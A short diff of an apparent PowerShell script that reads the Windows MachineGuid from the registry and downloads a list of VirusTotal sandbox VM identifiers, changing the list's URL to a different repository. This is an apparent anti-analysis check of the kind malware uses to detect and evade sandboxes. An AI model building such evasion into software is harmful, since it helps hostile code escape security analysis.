@@ -2,7 +2,7 @@
 $machineGuid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid").MachineGuid
 
 # URL của file MachineGuid.txt
-$url = "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt"
+$url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt"
 
 # Tải nội dung của file MachineGuid.txt
 try {
